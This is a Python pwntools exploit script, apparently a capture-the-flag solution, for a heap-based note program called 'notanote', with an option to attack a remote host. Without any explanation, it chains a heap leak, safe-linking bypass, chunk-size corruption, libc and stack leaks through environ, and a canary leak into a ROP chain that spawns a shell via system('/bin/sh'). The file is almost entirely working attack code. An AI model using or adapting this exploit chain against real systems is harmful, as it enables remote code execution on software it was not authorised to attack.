#!/usr/bin/python3

from pwn import *

exe = ELF('notanote', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def create_note(idx, tt_size, tt, ct_size, ct = b''):
    sln(b'> ', 1)
    sln(b'Index: ', idx)
    sln(b'size: ', tt_size)
    sla(b'Title: ', tt)
    sln(b'size: ', ct_size)
    if ct == b'':
        return
    sla(b'Content: ', ct)

def edit(idx):
    sln(b'> ', 2)
    sln(b'Index: ', idx)

def edit_tt(idx, tt, b = 1):
    edit(idx)
    sln(b'> ', 1)
    sla(b'title: ', tt)
    if b:
        back()
    
def edit_ct(idx, size, ct, b = 1):
    edit(idx)
    sln(b'> ', 2)
    sln(b'size: ', size)
    sla(b'Content: ', ct)
    if b:
        back()
    
def back():
    sln(b'> ', 3)
    
def view(idx):
    sln(b'> ', 3)
    sln(b'Index: ', idx)
    
def delete(idx):
    sln(b'> ', 4)
    sln(b'Index: ', idx)

def GDB():
    gdb.attach(r, gdbscript='''
        b*main+78
        ni
        # c
        # c 15
    ''')


if args.REMOTE:
    r = remote('103.162.14.116', 10001)
else:
    r = process(exe.path)
    # GDB()

create_note(0, 0x50, b'a', 0x18, b'a')
edit_ct(0, 0x30, b'chino')
create_note(1, 0x28, b'a', 0x400, b'a')
edit_tt(0, b'a'*0x50)
edit_tt(0, b'a'*0x48+p32(-1,sign=True))
view(0)
r.recvuntil(b'Content: ')
key = u64(r.recvline(False).ljust(8, b'\x00'))
heap_base = key << 12
print('heap: '+hex(heap_base))

create_note(2, 0x10, b'a', 0x30, b'a')
create_note(3, 0x10, b'a', 0x28, b'a')
create_note(4, 0x10, b'a', 0x18, b'a')
delete(3)
# delete(4)
delete(0)
create_note(5, 0x50, b'a'*0x48+p64(0xff,sign=True), 0x50, b'a')
edit_tt(2, p64((heap_base+0x2f0)^key))
create_note(0, 0x50, b'a', 0x18, b'a')
create_note(6, 0x10, b'a'*8+p32(0x561), 0x50, b'a')
delete(2)
# GDB()
create_note(2, 0x160, b'a', 0x18, b'a')
edit_tt(6, b'a'*0x80 + p64(heap_base+0x470))
for i in range(7):
    edit_tt(6, b'a'*0x68+ b'a'*(7-i))
# GDB()
edit_tt(6, b'a'*0x68+ b'\x21')
view(1)
r.recvuntil(b'Content: ')
libc.address = u64(r.recv(6)+b'\x00\x00')-0x1f6ce0
print('libc: '+hex(libc.address))
edit_tt(6, b'a'*0x68+ b'\x31')
edit_tt(1, b'a'*0x10+p64(libc.sym['environ']))
edit_tt(6, b'a'*0x68+ b'\x21')
view(1)
# GDB()
r.recvuntil(b'Content: ')
stack = u64(r.recv(6)+b'\x00\x00')
print('stack: '+hex(stack))
edit_tt(6, b'a'*0x68+ b'\x31')
edit_tt(1, b'a'*0x10+p64(stack-0x6f0+1))
edit_tt(6, b'a'*0x68+ b'\x21')
view(1)
r.recvuntil(b'Content: ')
canary = u64(b'\x00'+r.recv(7))
print(hex(canary))
edit_tt(6, b'a'*0x68+ b'\xff\xff')
pop_rdi = libc.address + 0x00000000000240e5
payload = b'a'*0x408+p64(canary) + p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(pop_rdi+1) + p64(libc.sym['system'])
edit_tt(1, payload, 0)


r.interactive()
